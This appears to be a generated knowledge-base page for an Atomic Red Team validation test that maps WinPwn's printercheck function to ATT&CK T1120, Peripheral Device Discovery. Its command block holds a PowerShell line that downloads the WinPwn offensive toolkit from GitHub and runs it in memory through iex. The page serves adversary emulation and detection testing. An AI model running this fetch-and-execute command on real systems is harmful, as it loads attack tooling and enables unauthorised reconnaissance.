---
atomic_guid: "cb6e76ca-861e-4a7f-be08-564caa3e6f75"
title: "WinPwn - printercheck"
framework: "atomic"
generated: "true"
attack_technique_id: "T1120"
attack_technique_name: "Peripheral Device Discovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1120/T1120.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "cb6e76ca-861e-4a7f-be08-564caa3e6f75"
  - "WinPwn - printercheck"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Search for printers / potential vulns using printercheck function of WinPwn

## ATT&CK Mapping

- [[kb/attack/techniques/T1120-peripheral_device_discovery|T1120: Peripheral Device Discovery]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
printercheck -noninteractive -consoleoutput
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1120/T1120.yaml)
